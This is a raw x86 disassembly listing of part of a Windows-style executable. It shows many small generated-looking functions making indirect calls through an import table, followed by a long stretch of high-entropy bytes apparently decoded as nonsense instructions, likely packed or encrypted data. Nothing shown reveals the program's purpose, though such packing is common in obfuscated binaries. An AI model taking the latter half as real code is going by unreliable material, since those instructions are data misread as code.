  402251:	sub    esp,0x60
  402254:	push   eax
  402255:	push   ebx
  402256:	push   ebx
  402257:	call   0x4019a4
  40225c:	add    esp,0x8
  40225f:	pop    eax
  402260:	push   eax
  402261:	push   0x0
  402263:	mov    eax,0x40403c
  402268:	call   DWORD PTR [eax]
  40226a:	pop    eax
  40226b:	push   eax
  40226c:	push   0x0
  40226e:	mov    eax,0x404000
  402273:	call   DWORD PTR [eax]
  402275:	pop    eax
  402276:	sub    esp,0xffffffa0
  402279:	mov    ebp,DWORD PTR [esp]
  40227c:	add    esp,0x4
  40227f:	ret    
	...
  4022d0:	mov    edi,edi
  4022d2:	push   ebp
  4022d3:	mov    ebp,esp
  4022d5:	sub    esp,0x48
  4022d8:	push   eax
  4022d9:	push   DWORD PTR [eax+0xbc]
  4022df:	push   edi
  4022e0:	call   0x402310
  4022e5:	add    esp,0x8
  4022e8:	pop    eax
  4022e9:	push   eax
  4022ea:	mov    eax,0x404044
  4022ef:	call   DWORD PTR [eax]
  4022f1:	pop    eax
  4022f2:	push   eax
  4022f3:	lea    ecx,[eax-0x100]
  4022f9:	push   ecx
  4022fa:	mov    eax,0x404020
  4022ff:	call   DWORD PTR [eax]
  402301:	test   eax,eax
  402303:	jne    0x4022f3
  402305:	pop    eax
  402306:	sub    esp,0xffffffb8
  402309:	mov    ebp,DWORD PTR [esp]
  40230c:	add    esp,0x4
  40230f:	ret    
  402310:	mov    edi,edi
  402312:	push   ebp
  402313:	mov    ebp,esp
  402315:	sub    esp,0x30
  402318:	push   eax
  402319:	push   0x0
  40231b:	mov    eax,0x40406c
  402320:	call   DWORD PTR [eax]
  402322:	pop    eax
  402323:	push   eax
  402324:	push   ebx
  402325:	push   ecx
  402326:	push   ecx
  402327:	push   DWORD PTR [eax+0x314]
  40232d:	call   0x4028f0
  402332:	add    esp,0x10
  402335:	pop    eax
  402336:	push   eax
  402337:	mov    eax,0x0
  40233c:	push   eax
  40233d:	mov    eax,0x40402c
  402342:	call   DWORD PTR [eax]
  402344:	pop    eax
  402345:	sub    esp,0xffffffd0
  402348:	mov    ebp,DWORD PTR [esp]
  40234b:	add    esp,0x4
  40234e:	ret    
  40234f:	add    BYTE PTR [ebx-0x1374aa01],cl
  402355:	sub    esp,0x50
  402358:	push   eax
  402359:	push   DWORD PTR [eax+0x1c8]
  40235f:	push   ecx
  402360:	push   DWORD PTR [eax+0x120]
  402366:	call   0x401448
  40236b:	add    esp,0xc
  40236e:	pop    eax
  40236f:	push   eax
  402370:	lea    eax,[eax-0x100]
  402376:	push   eax
  402377:	mov    eax,0x404020
  40237c:	call   DWORD PTR [eax]
  40237e:	test   eax,eax
  402380:	jne    0x402370
  402382:	pop    eax
  402383:	push   eax
  402384:	mov    eax,0x404044
  402389:	call   DWORD PTR [eax]
  40238b:	pop    eax
  40238c:	sub    esp,0xffffffb0
  40238f:	mov    ebp,DWORD PTR [esp]
  402392:	add    esp,0x4
  402395:	ret    
	...
  4023e6:	add    BYTE PTR [eax],al
  4023e8:	mov    edi,edi
  4023ea:	push   ebp
  4023eb:	mov    ebp,esp
  4023ed:	sub    esp,0x5c
  4023f0:	push   eax
  4023f1:	push   DWORD PTR [eax+0x258]
  4023f7:	push   DWORD PTR [eax+0x378]
  4023fd:	push   DWORD PTR [eax+0x14c]
  402403:	push   esi
  402404:	call   0x401960
  402409:	add    esp,0x10
  40240c:	pop    eax
  40240d:	push   eax
  40240e:	mov    eax,0x0
  402413:	push   eax
  402414:	mov    eax,0x404000
  402419:	call   DWORD PTR [eax]
  40241b:	pop    eax
  40241c:	push   eax
  40241d:	push   0x0
  40241f:	mov    eax,0x404080
  402424:	call   DWORD PTR [eax]
  402426:	pop    eax
  402427:	sub    esp,0xffffffa4
  40242a:	mov    ebp,DWORD PTR [esp]
  40242d:	add    esp,0x4
  402430:	ret    
  402431:	add    BYTE PTR [eax],al
  402433:	add    BYTE PTR [ebx-0x1374aa01],cl
  402439:	sub    esp,0x3c
  40243c:	push   eax
  40243d:	mov    esi,0x0
  402442:	push   esi
  402443:	mov    eax,0x40406c
  402448:	call   DWORD PTR [eax]
  40244a:	pop    eax
  40244b:	push   eax
  40244c:	push   DWORD PTR [eax+0x1a0]
  402452:	push   DWORD PTR [eax+0x1cc]
  402458:	call   0x401c18
  40245d:	add    esp,0x8
  402460:	pop    eax
  402461:	push   eax
  402462:	mov    eax,0x404044
  402467:	call   DWORD PTR [eax]
  402469:	pop    eax
  40246a:	sub    esp,0xffffffc4
  40246d:	mov    ebp,DWORD PTR [esp]
  402470:	add    esp,0x4
  402473:	ret    
	...
  4024c4:	mov    edi,edi
  4024c6:	push   ebp
  4024c7:	mov    ebp,esp
  4024c9:	sub    esp,0x38
  4024cc:	push   eax
  4024cd:	push   edx
  4024ce:	push   DWORD PTR [eax+0x184]
  4024d4:	push   edx
  4024d5:	call   0x4014d8
  4024da:	add    esp,0xc
  4024dd:	pop    eax
  4024de:	push   eax
  4024df:	push   0x0
  4024e1:	mov    eax,0x404040
  4024e6:	call   DWORD PTR [eax]
  4024e8:	pop    eax
  4024e9:	push   eax
  4024ea:	mov    eax,0x404018
  4024ef:	call   DWORD PTR [eax]
  4024f1:	pop    eax
  4024f2:	sub    esp,0xffffffc8
  4024f5:	mov    ebp,DWORD PTR [esp]
  4024f8:	add    esp,0x4
  4024fb:	ret    
  4024fc:	mov    edi,edi
  4024fe:	push   ebp
  4024ff:	mov    ebp,esp
  402501:	sub    esp,0x34
  402504:	push   eax
  402505:	push   DWORD PTR [eax+0x268]
  40250b:	push   esi
  40250c:	push   edx
  40250d:	call   0x401fb4
  402512:	add    esp,0xc
  402515:	pop    eax
  402516:	push   eax
  402517:	push   0x0
  402519:	mov    eax,0x40406c
  40251e:	call   DWORD PTR [eax]
  402520:	pop    eax
  402521:	push   eax
  402522:	push   0x0
  402524:	mov    eax,0x40402c
  402529:	call   DWORD PTR [eax]
  40252b:	pop    eax
  40252c:	sub    esp,0xffffffcc
  40252f:	mov    ebp,DWORD PTR [esp]
  402532:	add    esp,0x4
  402535:	ret    
  402536:	add    BYTE PTR [eax],al
  402538:	mov    edi,edi
  40253a:	push   ebp
  40253b:	mov    ebp,esp
  40253d:	sub    esp,0x44
  402540:	push   eax
  402541:	push   0x0
  402543:	mov    eax,0x404080
  402548:	call   DWORD PTR [eax]
  40254a:	pop    eax
  40254b:	push   eax
  40254c:	push   esi
  40254d:	push   esi
  40254e:	call   0x401bcc
  402553:	add    esp,0x8
  402556:	pop    eax
  402557:	push   eax
  402558:	mov    eax,0x404014
  40255d:	call   DWORD PTR [eax]
  40255f:	pop    eax
  402560:	sub    esp,0xffffffbc
  402563:	mov    ebp,DWORD PTR [esp]
  402566:	add    esp,0x4
  402569:	ret    
	...
  4025ba:	add    BYTE PTR [eax],al
  4025bc:	mov    edi,edi
  4025be:	push   ebp
  4025bf:	mov    ebp,esp
  4025c1:	sub    esp,0x30
  4025c4:	push   eax
  4025c5:	mov    ecx,0x0
  4025ca:	push   ecx
  4025cb:	mov    eax,0x404000
  4025d0:	call   DWORD PTR [eax]
  4025d2:	pop    eax
  4025d3:	push   eax
  4025d4:	push   DWORD PTR [eax+0x3ec]
  4025da:	push   DWORD PTR [eax+0x36c]
  4025e0:	call   0x402734
  4025e5:	add    esp,0x8
  4025e8:	pop    eax
  4025e9:	push   eax
  4025ea:	mov    eax,0x404014
  4025ef:	call   DWORD PTR [eax]
  4025f1:	pop    eax
  4025f2:	sub    esp,0xffffffd0
  4025f5:	mov    ebp,DWORD PTR [esp]
  4025f8:	add    esp,0x4
  4025fb:	ret    
  4025fc:	mov    edi,edi
  4025fe:	push   ebp
  4025ff:	mov    ebp,esp
  402601:	sub    esp,0x54
  402604:	push   eax
  402605:	mov    edi,0x0
  40260a:	push   edi
  40260b:	mov    eax,0x404074
  402610:	call   DWORD PTR [eax]
  402612:	pop    eax
  402613:	push   eax
  402614:	push   ebx
  402615:	push   DWORD PTR [eax+0x358]
  40261b:	push   DWORD PTR [eax+0x3dc]
  402621:	call   0x402118
  402626:	add    esp,0xc
  402629:	pop    eax
  40262a:	push   eax
  40262b:	mov    edx,0x0
  402630:	push   edx
  402631:	mov    eax,0x404034
  402636:	call   DWORD PTR [eax]
  402638:	pop    eax
  402639:	sub    esp,0xffffffac
  40263c:	mov    ebp,DWORD PTR [esp]
  40263f:	add    esp,0x4
  402642:	ret    
	...
  402733:	add    BYTE PTR [ebx-0x1374aa01],cl
  402739:	sub    esp,0x60
  40273c:	push   eax
  40273d:	push   esi
  40273e:	push   ecx
  40273f:	push   ecx
  402740:	push   edi
  402741:	call   0x401070
  402746:	add    esp,0x10
  402749:	pop    eax
  40274a:	push   eax
  40274b:	mov    eax,0x404018
  402750:	call   DWORD PTR [eax]
  402752:	pop    eax
  402753:	push   eax
  402754:	mov    esi,0x0
  402759:	push   esi
  40275a:	mov    eax,0x404030
  40275f:	call   DWORD PTR [eax]
  402761:	pop    eax
  402762:	sub    esp,0xffffffa0
  402765:	mov    ebp,DWORD PTR [esp]
  402768:	add    esp,0x4
  40276b:	ret    
  40276c:	mov    edi,edi
  40276e:	push   ebp
  40276f:	mov    ebp,esp
  402771:	sub    esp,0x24
  402774:	push   eax
  402775:	push   edi
  402776:	push   DWORD PTR [eax+0x198]
  40277c:	push   DWORD PTR [eax+0x214]
  402782:	call   0x401138
  402787:	add    esp,0xc
  40278a:	pop    eax
  40278b:	push   eax
  40278c:	mov    eax,0x404018
  402791:	call   DWORD PTR [eax]
  402793:	pop    eax
  402794:	push   eax
  402795:	mov    edx,0x0
  40279a:	push   edx
  40279b:	mov    eax,0x404074
  4027a0:	call   DWORD PTR [eax]
  4027a2:	pop    eax
  4027a3:	sub    esp,0xffffffdc
  4027a6:	mov    ebp,DWORD PTR [esp]
  4027a9:	add    esp,0x4
  4027ac:	ret    
	...
  4028ed:	add    BYTE PTR [eax],al
  4028ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4028f5:	sub    esp,0x28
  4028f8:	push   eax
  4028f9:	push   ecx
  4028fa:	push   esi
  4028fb:	call   0x4025fc
  402900:	add    esp,0x8
  402903:	pop    eax
  402904:	push   eax
  402905:	push   0x0
  402907:	mov    eax,0x404074
  40290c:	call   DWORD PTR [eax]
  40290e:	pop    eax
  40290f:	push   eax
  402910:	mov    eax,0x404044
  402915:	call   DWORD PTR [eax]
  402917:	pop    eax
  402918:	sub    esp,0xffffffd8
  40291b:	mov    ebp,DWORD PTR [esp]
  40291e:	add    esp,0x4
  402921:	ret    
  402922:	add    BYTE PTR [eax],al
  402924:	mov    al,ds:0x18167d2f
  402929:	sbb    eax,0xa3e48828
  40292e:	xchg   ebx,eax
  40292f:	loop   0x40296b
  402931:	in     eax,dx
  402932:	(bad)  
  402933:	cmp    BYTE PTR [edi-0x5119020a],dh
  402939:	add    eax,0x538f0213
  40293e:	mov    dh,0x13
  402940:	das    
  402941:	nop
  402942:	or     bh,bl
  402944:	enter  0xfcca,0xf
  402948:	outs   dx,DWORD PTR ds:[esi]
  402949:	sbb    si,cx
  40294c:	ret    
  40294d:	add    DWORD PTR [ebx+0x3b97a1b8],ecx
  402953:	jbe    0x402900
  402955:	jecxz  0x402962
  402957:	mov    ecx,ds
  402959:	and    cl,BYTE PTR [edi+0x2d]
  40295c:	jbe    0x4028e3
  40295e:	pop    ebx
  40295f:	aad    0xfe
  402961:	and    esi,ecx
  402963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402964:	xor    ebx,esp
  402966:	jbe    0x402985
  402968:	or     bh,BYTE PTR [ebx+0x67287ea2]
  40296e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40296f:	push   edi
  402970:	dec    ebp
  402971:	mov    cs,WORD PTR [edi+0x26]
  402974:	jbe    0x4028fb
  402976:	pop    ebx
  402977:	push   esp
  402978:	mov    bl,0x6b
  40297a:	dec    esp
  40297b:	dec    esi
  40297c:	sbb    dh,BYTE PTR [esi+0x16edfa69]
  402982:	retf   
  402983:	sub    ebp,DWORD PTR [esi]
  402985:	aad    0xd8
  402987:	aam    0x42
  402989:	push   eax
  40298a:	les    ebp,FWORD PTR [esi+0xcd65389]
  402990:	mov    bh,BYTE PTR [ecx]
  402992:	fwait
  402993:	stos   BYTE PTR es:[edi],al
  402994:	push   cs
  402995:	aad    0x5b
  402997:	push   esp
  402998:	lea    edi,[edx-0x2f]
  40299b:	add    BYTE PTR [esi-0x762ba389],bl
  4029a1:	daa    
  4029a2:	sub    bl,dh
  4029a4:	iret   
  4029a5:	xchg   ebp,eax
  4029a6:	pop    ebx
  4029a7:	aam    0x89
  4029a9:	xlat   BYTE PTR ds:[ebx]
  4029aa:	dec    edi
  4029ab:	fnstenv [ebp+eax*4+0x5b]
  4029af:	pop    ebp
  4029b0:	iret   
  4029b1:	xchg   BYTE PTR [ebp-0x22],al
  4029b4:	sbb    al,0xe6
  4029b6:	xor    edx,DWORD PTR [ebp+0x43d616e5]
  4029bc:	ds loopne 0x4029f7
  4029bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029c0:	(bad)  [ecx]
  4029c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c3:	jge    0x402a43
  4029c5:	or     al,0x5d
  4029c7:	mov    esi,0x59e11289
  4029cc:	adc    esp,eax
  4029ce:	xor    ebx,DWORD PTR [esp+ebp*8+0x257fd71b]
  4029d5:	jp     0x4029e3
  4029d7:	fadd   QWORD PTR [eax]
  4029d9:	cmp    al,0xa3
  4029db:	test   al,0xb2
  4029dd:	popf   
  4029de:	xor    DWORD PTR [ecx+eiz*8+0x762bb77a],edx
  4029e5:	in     eax,dx
  4029e6:	call   edx
  4029e8:	mov    DWORD PTR [edx-0x33],edi
  4029eb:	sub    ecx,DWORD PTR [ecx+0x715f4bd0]
  4029f1:	jg     0x4029f9
  4029f3:	sub    esi,DWORD PTR [esi-0x7b]
  4029f6:	or     ebx,DWORD PTR [ecx+0x3c]
  4029f9:	stos   BYTE PTR es:[edi],al
  4029fa:	pop    esp
  4029fb:	aam    0x89
  4029fd:	cmp    al,0xff
  4029ff:	ror    BYTE PTR [ecx-0x4a70ad86],cl
  402a05:	ins    DWORD PTR es:[edi],dx
  402a06:	rcl    cl,1
  402a08:	mov    DWORD PTR [edx-0x8],edi
  402a0b:	jne    0x4029fe
  402a0d:	mov    cl,0x7f
  402a0f:	and    BYTE PTR [ecx-0x7d],0xa3
  402a13:	sub    esi,DWORD PTR [esi+0x6d]
  402a16:	(bad)  
  402a18:	mov    DWORD PTR [edx+0x2a],edi
  402a1b:	rcr    DWORD PTR [eax*4+0xf76d431],cl
  402a22:	ret    
  402a23:	jl     0x4029ae
  402a25:	shl    BYTE PTR [ebx+0x5f],1
  402a28:	les    edx,FWORD PTR [edx]
  402a2a:	int    0x2b
  402a2c:	and    bl,ch
  402a2e:	pop    edx
  402a2f:	loope  0x4029de
  402a31:	sub    dh,ah
  402a33:	jge    0x402a56
  402a35:	jp     0x402a43
  402a37:	clc    
  402a38:	shr    DWORD PTR ds:0x6d6e7da6,1
  402a3e:	jo     0x402a17
  402a40:	mov    DWORD PTR [edx+0x2a],edi
  402a43:	ins    DWORD PTR es:[edi],dx
  402a44:	dec    edx
  402a45:	or     BYTE PTR [edi-0x2e],bl
  402a48:	out    dx,eax
  402a49:	(bad)  
  402a4a:	out    0x3d,eax
  402a4c:	jbe    0x4029f3
  402a4e:	sub    al,0xc2
  402a50:	mov    al,0x22
  402a52:	xchg   ebx,eax
  402a53:	pop    edi
  402a54:	addr16 push cs
  402a56:	add    esp,eax
  402a58:	jecxz  0x402ad8
  402a5a:	iret   
  402a5b:	sub    eax,DWORD PTR [esi-0x7b]
  402a5e:	pop    ebx
  402a5f:	sub    edi,ecx
  402a61:	sub    dh,dl
  402a63:	aam    0x23
  402a65:	xchg   ebp,eax
  402a66:	(bad)  
  402a67:	test   eax,0x41f32ae5
  402a6c:	jb     0x402a40
  402a6e:	push   cs
  402a6f:	sub    ebx,esp
  402a71:	jbe    0x402a66
  402a73:	inc    ecx
  402a74:	je     0x402a48
  402a76:	push   cs
  402a77:	add    BYTE PTR [edx],0xb5
  402a7a:	sub    dl,al
  402a7c:	test   DWORD PTR [ecx],esp
  402a7e:	add    eax,0xff76dc2b
  402a83:	mov    al,ds:0xe81086b8
  402a88:	add    al,0x3
  402a8a:	mov    edi,0x4aa521a0
  402a8f:	arpl   ax,cx
  402a91:	outs   dx,BYTE PTR ds:[esi]
  402a92:	mov    ds:0x103279d3,al
  402a97:	shr    cl,cl
  402a99:	icebp  
  402a9a:	out    dx,al
  402a9b:	aas    
  402a9c:	repz inc ebp
  402a9e:	das    
  402a9f:	xchg   ebp,eax
  402aa0:	add    bh,BYTE PTR ds:0xf1b6aeaf
  402aa6:	popa   
  402aa7:	cmp    al,0x18
  402aa9:	jle    0x402a52
  402aab:	sub    edi,ebp
  402aad:	dec    ebp
  402aae:	(bad)  
  402aaf:	xchg   ebx,eax
  402ab0:	lods   eax,DWORD PTR ds:[esi]
  402ab1:	xchg   edx,eax
  402ab2:	shr    BYTE PTR [ecx],1
  402ab4:	jbe    0x402a3b
  402ab6:	pop    esi
  402ab7:	mov    ds:0x3bde859d,eax
  402abc:	std    
  402abd:	cli    
  402abe:	push   edi
  402abf:	xlat   BYTE PTR ds:[ebx]
  402ac0:	jb     0x402ae3
  402ac2:	mul    DWORD PTR [eax-0x7af4285e]
  402ac8:	fisubr WORD PTR [ebx]
  402aca:	cmc    
  402acb:	inc    ecx
  402acc:	jb     0x402aa2
  402ace:	add    ch,BYTE PTR [ebx]
  402ad0:	fdiv   QWORD PTR [esi-0x4]
  402ad3:	sbb    BYTE PTR [esi-0x2981512e],dh
  402ad9:	icebp  
  402ada:	push   0xffffffd8
  402adc:	sar    BYTE PTR [edx+0xc],cl
  402adf:	fcom   st(1)
  402ae1:	sbb    esp,DWORD PTR [edx]
  402ae3:	in     al,dx
  402ae4:	pop    esi
  402ae5:	addr16 call 0xa7bbad27
  402aeb:	sub    ebx,DWORD PTR [esi-0x762ba4fc]
  402af1:	and    cl,bh
  402af3:	sub    esi,DWORD PTR [esi]
  402af5:	test   DWORD PTR [ebx+0x2b],ebx
  402af8:	cld    
  402af9:	adc    dh,cl
  402afb:	mov    al,ds:0x3cab0e8d
  402b00:	cmp    DWORD PTR [esi-0x59],0x2b
  402b04:	adc    bh,BYTE PTR [edx+0x6c]
  402b07:	in     al,0x89
  402b09:	jp     0x402ab2
  402b0b:	jae    0x402b0a
  402b0d:	lds    edx,FWORD PTR [edi+0x5f]
  402b10:	leave  
  402b11:	jbe    0x402aaf
  402b13:	jae    0x402b83
  402b15:	icebp  
  402b16:	pop    edi
  402b17:	pop    edi
  402b18:	mov    DWORD PTR [ecx-0x5e855fa2],edx
  402b1e:	pop    esi
  402b1f:	popf   
  402b20:	mov    ch,0xf1
  402b22:	aam    0x3
  402b24:	jne    0x402b98
  402b26:	shr    BYTE PTR [ecx+edx*4+0x1037d7f3],1
  402b2d:	jb     0x402b47
  402b2f:	ret    0x5a89
  402b32:	shl    BYTE PTR [edi],1
  402b34:	adc    ah,BYTE PTR [ebx+eax*2]
  402b37:	aam    0x89
  402b39:	jp     0x402b65
  402b3b:	imul   eax,DWORD PTR [esi+0xc],0x23
  402b3f:	fdiv   QWORD PTR [esi+0x2f]
  402b42:	mov    bl,0xc3
  402b44:	add    BYTE PTR [edi-0x4c2b2ba5],al
  402b4a:	jmp    DWORD PTR [edx-0x4ab85efe]
  402b50:	fst    DWORD PTR [edx-0x7a89d068]
  402b56:	add    edx,DWORD PTR [ebp-0xf]
  402b59:	and    ah,BYTE PTR [edi+0x2c857629]
  402b5f:	fild   DWORD PTR [edx]
  402b61:	jle    0x402ae6
  402b63:	in     al,dx
  402b64:	jb     0x402b07
  402b66:	pop    ebx
  402b67:	aam    0x89
  402b69:	jp     0x402b11
  402b6b:	pop    esi
  402b6c:	push   edx
  402b6d:	or     DWORD PTR [ebx],0xc7b949e7
  402b73:	mov    al,ds:0xe82d8685
  402b78:	add    cl,ah
  402b7a:	daa    
  402b7b:	sub    esi,DWORD PTR [esi-0x7b]
  402b7e:	fsub   QWORD PTR [edx]
  402b80:	std    
  402b81:	or     DWORD PTR [edx+0x57fbfdd8],esp
  402b87:	push   ecx
  402b88:	jbe    0x402b98
  402b8a:	int    0x28
  402b8c:	(bad)  
  402b8d:	rcr    BYTE PTR [edx-0x7e],cl
  402b90:	(bad)  
  402b91:	jmp    DWORD PTR [edi+0x5e]
  402b94:	jb     0x402b68
  402b96:	pop    edx
  402b97:	or     BYTE PTR [ecx+0xa0f12a],0x95
  402b9e:	pop    esi
  402b9f:	daa    
  402ba0:	add    al,BYTE PTR [eax+ecx*1-0x590f4952]
  402ba7:	(bad)  
  402ba8:	jle    0x402b9b
  402baa:	imul   esi,DWORD PTR [ebp+0x27],0x8dbe0fd5
  402bb1:	sub    edi,esi
  402bb3:	aam    0x23
  402bb5:	mov    DWORD PTR ds:0x67ff8f5f,ecx
  402bbb:	mov    ebx,0xc41d0ee6
  402bc0:	add    al,0x4e
  402bc2:	mov    ds:0x9b00db7c,al
  402bc7:	mov    al,ds:0x2ba7d392
  402bcc:	jbe    0x402bd3
  402bce:	sub    al,0xd0
  402bd0:	add    al,0x3e
  402bd2:	mov    ds:0x5a7a5329,al
  402bd7:	aam    0x9
  402bd9:	sub    ah,BYTE PTR [esi+0x5a91525e]
  402bdf:	add    BYTE PTR [ecx+0x29cb4ad1],0xdb
  402be6:	add    ecx,DWORD PTR [ebp+0x7cf42add]
  402bec:	mov    eax,edx
  402bee:	push   edi
  402bef:	mov    WORD PTR [edx],cs
  402bf1:	mov    esp,0xe4f9c0b3
  402bf6:	sahf   
  402bf7:	mov    ah,0x2
  402bf9:	test   eax,0xf375d92a
  402bfe:	addr16 (bad) 
  402c00:	fisttp WORD PTR [esi+0x20]
  402c03:	stc    
  402c04:	jns    0x402c07
  402c06:	int3   
  402c07:	aam    0x89
  402c09:	jp     0x402c35
  402c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c0c:	rol    BYTE PTR [ebp-0x33fd2ba5],cl
  402c12:	pop    es
  402c13:	sub    esi,DWORD PTR [esi-0x7b]
  402c16:	fsub   QWORD PTR [edx]
  402c18:	xchg   dh,bh
  402c1a:	and    al,0x2b
  402c1c:	jbe    0x402ba3
  402c1e:	pop    esi
  402c1f:	daa    
  402c20:	and    al,0xf1
  402c22:	pop    edi
  402c23:	sub    BYTE PTR [ebp-0x26ef292b],cl
  402c29:	sub    esi,ebp
  402c2b:	jnp    0x402c49
  402c2d:	xor    DWORD PTR [ebx],0xa77a99d4
  402c33:	jl     0x402c2a
  402c35:	ins    DWORD PTR es:[edi],dx
  402c36:	pop    edi
  402c37:	test   bl,ah
  402c39:	jle    0x402c0a
  402c3b:	sub    esp,DWORD PTR [esi-0x7b]
  402c3e:	pop    ebx
  402c3f:	or     DWORD PTR [eax],0x7e
  402c42:	sub    DWORD PTR [ebx],0x66
  402c45:	test   DWORD PTR [ebx+0x2b],ebx
  402c48:	fdiv   QWORD PTR [esi-0x5a]
  402c4b:	jge    0x402cc7
  402c4d:	fild   WORD PTR [eax]
  402c4f:	jns    0x402bf3
  402c51:	mov    dl,0xf4
  402c53:	mov    al,ds:0x57b054be
  402c58:	pusha  
  402c59:	jle    0x402bed
  402c5b:	jmp    0x402c6d
  402c5d:	sub    BYTE PTR ds:0xd34a897d,bh
  402c63:	and    edx,DWORD PTR [ebx+0x7a]
  402c66:	dec    edx
  402c67:	aam    0x89
  402c69:	jnp    0x402c1e
  402c6b:	sub    al,0x94
  402c6d:	imul   eax,DWORD PTR [eax],0x59
  402c70:	int    0x5e
  402c72:	mov    ds:0x5ad5247a,eax
  402c77:	in     eax,0xe1
  402c79:	jp     0x402c32
  402c7b:	sub    esi,DWORD PTR [esi-0x2e]
  402c7e:	fidivr WORD PTR [ecx*4+0x1e1aa62a]
  402c85:	test   DWORD PTR [ebx-0x2c],ecx
  402c88:	mov    DWORD PTR ds:0x85522f24,ebp
  402c8e:	dec    ebx
  402c8f:	aam    0x89
  402c91:	test   eax,esi
  402c93:	daa    
  402c94:	mov    eax,edx
  402c96:	push   edi
  402c97:	mov    ss,eax
  402c99:	and    bh,bh
  402c9b:	scas   al,BYTE PTR es:[edi]
  402c9c:	mov    edi,0x4ab5d8f0
  402ca1:	sbb    cl,BYTE PTR [edx+0x2c]
  402ca4:	(bad)  [edi-0x5c]
  402ca7:	pop    ecx
  402ca8:	mov    ebp,0x9ea06279
  402cad:	push   cs
  402cae:	scas   al,BYTE PTR es:[edi]
  402caf:	ins    DWORD PTR es:[edi],dx
  402cb0:	cdq    
  402cb1:	jp     0x402c5a
  402cb3:	sub    ebx,DWORD PTR [esi-0x762ba592]
  402cb9:	rol    BYTE PTR [esi-0x4c7a89d5],0x35
  402cc0:	jbe    0x402c47
  402cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc3:	jl     0x402c94
  402cc5:	sbb    BYTE PTR [ebx-0x2c],0x89
  402cc9:	xchg   edx,eax
  402cca:	jno    0x402ca0
  402ccc:	mov    DWORD PTR [edx-0x2a],edi
  402ccf:	add    al,0x2
  402cd1:	dec    esi
  402cd2:	adc    DWORD PTR [edx-0x2ba47a81],0x61
  402cd9:	mov    ebp,0x9762ba6
  402cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cdf:	pop    edi
  402ce0:	inc    ebx
  402ce1:	xchg   edx,eax
  402ce2:	sbb    esp,edx
  402ce4:	mov    DWORD PTR [edx+0x6e],edi
  402ce7:	adc    al,0xd9
  402ce9:	mov    ebx,0x81b72c6f
  402cee:	jg     0x402cc9
  402cf0:	mov    BYTE PTR [esi-0x7d],bh
  402cf3:	xchg   edx,esi
  402cf5:	inc    ebp
  402cf6:	sub    al,0x25
  402cf8:	shl    ecx,1
  402cfa:	pop    esi
  402cfb:	adc    BYTE PTR [ebx-0x361a10f],dh
  402d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d02:	sub    bl,BYTE PTR [edi]
  402d04:	push   edx
  402d05:	cmp    al,0x51
  402d07:	aam    0x89
  402d09:	jp     0x402d5a
  402d0b:	mov    esi,0xc45a7a89
  402d10:	ds jbe 0x402d04
  402d13:	jne    0x402d3c
  402d15:	cmp    al,0x53
  402d17:	aam    0x89
  402d19:	jp     0x402d6a
  402d1b:	scas   al,BYTE PTR es:[edi]
  402d1c:	mov    DWORD PTR [edx+0x5a],edi
  402d1f:	mov    fs,WORD PTR [ecx+0x5]
  402d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d23:	sub    esi,DWORD PTR [esi+0xf]
  402d26:	das    
  402d27:	lock xchg ebp,eax
  402d29:	sbb    esp,DWORD PTR [edx+0x7a]
  402d2c:	mov    bh,0x6d
  402d2e:	inc    esp
  402d2f:	ins    DWORD PTR es:[edi],dx
  402d30:	test   eax,0x3e2ba77a
  402d35:	icebp  
  402d36:	imul   ebp,DWORD PTR [ebp-0x75],0x7a
  402d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d3b:	sub    edi,DWORD PTR [esi]
  402d3d:	icebp  
  402d3e:	jae    0x402dad
  402d40:	test   eax,0x3e2ba77a
  402d45:	icebp  
  402d46:	jnp    0x402db5
  402d48:	lea    edi,[edx-0x59]
  402d4b:	sub    edi,DWORD PTR [esi]
  402d4d:	icebp  
  402d4e:	inc    ebx
  402d4f:	ins    DWORD PTR es:[edi],dx
  402d50:	leave  
  402d51:	jp     0x402cfa
  402d53:	sub    edi,DWORD PTR [esi]
  402d55:	icebp  
  402d56:	dec    ebx
  402d57:	ins    DWORD PTR es:[edi],dx
  402d58:	lea    edi,[edx-0x59]
  402d5b:	sub    edi,DWORD PTR [esi]
  402d5d:	icebp  
  402d5e:	push   ebx
  402d5f:	ins    DWORD PTR es:[edi],dx
  402d60:	leave  
  402d61:	jp     0x402d0a
  402d63:	sub    edi,DWORD PTR [esi]
  402d65:	icebp  
  402d66:	pop    ebx
  402d67:	pop    edi
  402d68:	dec    eax
  402d69:	and    esp,DWORD PTR [edx+0x4b]
  402d6c:	std    
  402d6d:	shr    BYTE PTR [ebx],1
  402d6f:	push   ebp
  402d70:	jnp    0x402d5d
  402d72:	dec    ebp
  402d73:	outs   dx,BYTE PTR ds:[esi]
  402d74:	push   cs
  402d75:	push   cs
  402d76:	adc    al,0xbc
  402d78:	add    al,BYTE PTR [edx+eiz*1+0x2f852e56]
  402d7f:	xlat   BYTE PTR ds:[ebx]
  402d80:	mov    BYTE PTR [edi],cl
  402d82:	jmp    DWORD PTR [eax+0x14dce533]
  402d88:	std    
  402d89:	outs   dx,DWORD PTR ds:[esi]
  402d8a:	sub    al,0x6d
  402d8c:	dec    edx
  402d8d:	xlat   BYTE PTR ds:[ebx]
  402d8e:	loope  0x402d60
  402d90:	mov    DWORD PTR [edx-0x59],edi
  402d93:	ret    
  402d94:	rol    DWORD PTR [ebx+ebx*2+0x5779d3d4],cl
  402d9b:	sub    BYTE PTR [esi-0x3106c52],cl
  402da1:	and    dl,al
  402da3:	es jne 0x402d96
  402da6:	pop    es
  402da7:	xlat   BYTE PTR ds:[ebx]
  402da8:	hlt    
  402da9:	mov    ah,BYTE PTR es:[esi+0x2a]
  402dad:	add    BYTE PTR [eax-0x8287d60],dl
  402db3:	add    BYTE PTR [edi+ebx*8+0x796057f6],dh
  402dba:	inc    ebp
  402dbb:	enter  0x4617,0x3b
  402dbf:	push   edi
  402dc0:	hlt    
  402dc1:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402dc3:	pop    edi
